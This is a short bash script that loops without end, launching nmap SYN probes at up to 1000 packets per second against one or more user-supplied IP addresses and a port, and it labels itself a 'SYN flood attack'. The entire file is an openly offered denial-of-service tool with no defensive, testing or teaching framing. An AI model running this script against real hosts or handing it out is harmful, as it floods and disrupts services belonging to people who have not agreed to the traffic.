#!/bin/bash
if [ "$#" -lt 2 ]; then
    echo "Usage: $0 <TARGET_IP(s)> <TARGET_PORT>"
    echo "Examples:"
    echo "  $0 192.168.1.101 80            # Single target"
    echo "  $0 '192.168.1.101 192.168.1.102' 80  # Multiple targets"
    exit 1
fi

# Assign arguments
TARGET_IPS=($1)  # Space-separated IPs
TARGET_PORT=$2

# Infinite loop to send SYN packets
while true; do
    for IP in "${TARGET_IPS[@]}"; do
        echo "Launching SYN flood attack on $IP:$TARGET_PORT using Nmap..."
        nmap -p "$TARGET_PORT" --scanflags SYN --max-rate 1000 --max-retries 0 "$IP" &
    done
    wait # Wait for all background processes to complete
done
